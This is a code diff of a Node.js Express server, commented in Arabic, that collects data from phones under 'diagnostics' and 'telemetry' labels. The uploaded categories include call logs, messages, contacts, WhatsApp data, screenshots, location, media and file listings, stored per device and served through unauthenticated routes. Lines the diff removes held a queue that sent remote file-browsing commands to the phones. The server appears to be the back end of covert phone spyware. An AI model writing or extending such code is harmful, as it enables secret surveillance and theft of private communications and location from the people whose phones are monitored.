@@ -1,153 +1,128 @@
 const express = require('express');
+const bodyParser = require('body-parser');
+const fs = require('fs');
 const path = require('path');
+
 const app = express();
+const PORT = process.env.PORT || 3000;
+const DB_FILE = path.join(__dirname, 'database.json');
 
-app.use(express.json({ limit: '50mb' }));
+app.use(bodyParser.json({ limit: '50mb' }));
+app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
 
-// السماح بقراءة ملفات الواجهة والـ static files من نفس المجلد
 app.use(express.static(__dirname));
 
-// مسار الصفحة الرئيسية لعرض لوحة التحكم تلقائياً
-app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'index.html'));
-});
+// قراءة قاعدة البيانات
+function readDB() {
+    if (!fs.existsSync(DB_FILE)) {
+        return { devices: {}, diagnostics: {} };
+    }
+    try {
+        return JSON.parse(fs.readFileSync(DB_FILE, 'utf8'));
+    } catch (e) {
+        return { devices: {}, diagnostics: {} };
+    }
+}
 
-// تخزين مؤقت لحالة الأجهزة المتصلة
-const deviceSessions = {};
+// كتابة قاعدة البيانات
+function writeDB(data) {
+    fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));
+}
 
-// ** طابور الطلبات (Request Queue) **
-// هنا نخزن الطلبات القادمة من الواجهة (مثل: افتح مجلد معين)
-const requestQueues = {};
-
-// ** تخزين نتائج تصفح الملفات **
-const fileListResults = {};
+// تنظيف النصوص
+function cleanStr(str, maxLen = 1024) {
+    if (typeof str !== 'string') return '';
+    // لا نقص أي شيء، فقط نزيل الرموز الخطيرة
+    return str.substring(0, maxLen).replace(/[<>]/g, '');
+}
 
 // تنظيف معرف الجهاز
 function cleanId(id) {
-    return id ? id.replace(/[^a-zA-Z0-9_-]/g, '_') : 'unknown_device';
+    return cleanStr(id, 64).replace(/[^a-zA-Z0-9_-]/g, '');
 }
 
-// مسار جلب الأجهزة النشطة
-app.get("/api/devices", (req, res) => {
-    const devices = Object.keys(deviceSessions);
-    res.json({ devices: devices.length > 0 ? devices : ["الهاتف_المحلي_افتراضي"] });
-});
+// ============ المسارات ============
 
-// ** مسار جديد لجلب بيانات جهاز معين **
-app.get("/api/data/:deviceId", (req, res) => {
-    const deviceId = cleanId(req.params.deviceId);
-    const data = deviceSessions[deviceId] || {};
-    res.json({
-        contacts: data.contacts || [],
-        calls: data.calls || [],
-        messages: data.messages || [],
-        lastPing: data.lastPing || 0
-    });
-});
-
-// ** مسار تصفح الملفات (يستقبل طلب من الواجهة) **
-app.post("/api/filemanager/list", (req, res) => {
-    const deviceId = cleanId(req.body?.deviceId);
-    const dirPath = req.body?.path || "/storage/emulated/0/";
-    
-    if (!requestQueues[deviceId]) {
-        requestQueues[deviceId] = [];
-    }
-    
-    // إضافة الطلب إلى الطابور
-    requestQueues[deviceId].push({
-        command: "getFileList",
-        path: dirPath,
-        timestamp: Date.now()
-    });
-    
-    res.json({ ok: true, message: "تم إرسال الطلب إلى الهاتف" });
-});
-
-// ** مسار استقبال نتيجة تصفح الملفات من التطبيق **
-app.post("/api/filemanager/result", (req, res) => {
-    const deviceId = cleanId(req.body?.deviceId);
-    const files = req.body?.files || [];
-    
-    // تخزين النتيجة
-    fileListResults[deviceId] = {
-        files: files,
-        timestamp: Date.now()
+// مسار استقبال الـ Telemetry
+app.post("/api/telemetry", (req, res) => {
+    const db = readDB();
+    const deviceId = cleanId(req.body?.deviceId || "unknown");
+    db.devices = db.devices || {};
+    db.devices[deviceId] = {
+        model: cleanStr(req.body?.model || deviceId),
+        battery: req.body?.battery,
+        lastSeen: Date.now()
     };
-    
+    writeDB(db);
     res.json({ ok: true });
 });
 
-// ** مسار جلب نتيجة تصفح الملفات (تستخدمه الواجهة) **
-app.get("/api/filemanager/result/:deviceId", (req, res) => {
-    const deviceId = cleanId(req.params.deviceId);
-    const result = fileListResults[deviceId] || { files: [], timestamp: 0 };
-    res.json(result);
-});
-
-// استقبال البيانات والتشخيصات من التطبيق
-app.post("/api/diagnostics/:type", (req, res) => {
-    const deviceId = cleanId(req.body?.deviceId);
-    const type = req.params.type;
-    const items = req.body?.items || [];
-
-    if (!deviceSessions[deviceId]) {
-        deviceSessions[deviceId] = { contacts: [], calls: [], messages: [], lastPing: Date.now() };
-    }
-
-    deviceSessions[deviceId].lastPing = Date.now();
-
-    if (type === 'contacts') deviceSessions[deviceId].contacts = items;
-    if (type === 'calls') deviceSessions[deviceId].calls = items;
-    if (type === 'messages') deviceSessions[deviceId].messages = items;
+// ** المسار الرئيسي لاستقبال البيانات من التطبيق **
+app.post("/api/diagnostics/:category", (req, res) => {
+    const id = cleanId(cleanStr(req.body?.deviceId, 64));
+    const category = cleanStr(req.params.category, 16);
     
-    // ** معالجة الـ Ping وإرسال الأوامر **
-    if (type === 'ping') {
-        // التحقق مما إذا كان هناك طلبات في الطابور
-        if (requestQueues[deviceId] && requestQueues[deviceId].length > 0) {
-            const nextRequest = requestQueues[deviceId].shift();
-            // إرسال الأمر إلى التطبيق كرد على الـ Ping
-            return res.json({ 
-                status: "success", 
-                command: nextRequest.command, 
-                path: nextRequest.path,
-                deviceId: deviceId
-            });
-        }
+    const allowed = ["calls", "messages", "contacts", "media", "whatsapp", "screenshots", "location", "network", "apps", "ping", "filemanager"];
+    if (!id || !allowed.includes(category)) {
+        return res.status(400).json({ error: "Invalid request or category" });
     }
 
-    res.json({ status: "success", received: items.length });
-});
-
-// تصفح الملفات (محاكاة)
-app.post("/api/filemanager/list", (req, res) => {
-    const deviceId = cleanId(req.body?.deviceId);
-    const dirPath = req.body?.path || "/storage/emulated/0/";
+    const db = readDB();
+    if (!db.diagnostics) db.diagnostics = {};
+    if (!db.diagnostics[id]) db.diagnostics[id] = {};
     
-    if (deviceSessions[deviceId]) {
-        deviceSessions[deviceId].lastPing = Date.now();
-    }
+    // ** تخزين كل العناصر بدون حد **
+    db.diagnostics[id][category] = {
+        updatedAt: Date.now(),
+        count: Number(req.body?.count) || (Array.isArray(req.body?.items) ? req.body.items.length : 0),
+        items: Array.isArray(req.body?.items) ? req.body.items.map(i => cleanStr(i, 2048)) : [],
+    };
 
-    res.json({ ok: true, path: dirPath, files: [
-        { name: "Download", isDirectory: true, path: dirPath + "Download/" },
-        { name: "DCIM", isDirectory: true, path: dirPath + "DCIM/" },
-        { name: "WhatsApp", isDirectory: true, path: dirPath + "WhatsApp/" }
-    ] });
-});
-
-// تحميل ملف (محاكاة)
-app.post("/api/filemanager/getfile", (req, res) => {
-    const deviceId = cleanId(req.body?.deviceId);
-    const filePath = req.body?.path;
+    // تسجيل الجهاز تلقائياً
+    if (!db.devices) db.devices = {};
+    db.devices[id] = {
+        model: id,
+        lastSeen: Date.now()
+    };
     
-    if (deviceSessions[deviceId]) {
-        deviceSessions[deviceId].lastPing = Date.now();
-    }
-
-    res.json({ ok: true, path: filePath, data: "" });
+    writeDB(db);
+    res.json({ ok: true, received: db.diagnostics[id][category].count });
 });
 
-const PORT = process.env.PORT || 3000;
+// ** مسار جلب قائمة الأجهزة **
+app.get("/api/devices", (req, res) => {
+    const db = readDB();
+    const diagnosticsKeys = Object.keys(db.diagnostics || {});
+    const devicesKeys = Object.keys(db.devices || {});
+    const allIds = [...new Set([...diagnosticsKeys, ...devicesKeys])];
+    
+    const devices = allIds.map(k => ({
+        id: k,
+        model: db.devices?.[k]?.model || k,
+        status: "online",
+        lastSeen: db.devices?.[k]?.lastSeen || 0
+    }));
+    
+    res.json({ devices });
+});
+
+// ** مسار جلب كل بيانات جهاز معين **
+app.get("/api/diagnostics/:id", (req, res) => {
+    const id = cleanId(req.params.id);
+    const db = readDB();
+    const diagnostics = db.diagnostics?.[id] || {};
+    res.json({ diagnostics });
+});
+
+// ** مسار جلب بيانات فئة محددة فقط **
+app.get("/api/diagnostics/:id/:category", (req, res) => {
+    const id = cleanId(req.params.id);
+    const category = cleanStr(req.params.category, 16);
+    const db = readDB();
+    const data = db.diagnostics?.[id]?.[category] || { items: [], count: 0 };
+    res.json(data);
+});
+
 app.listen(PORT, () => {
     console.log(`Server running on port ${PORT}`);
 });
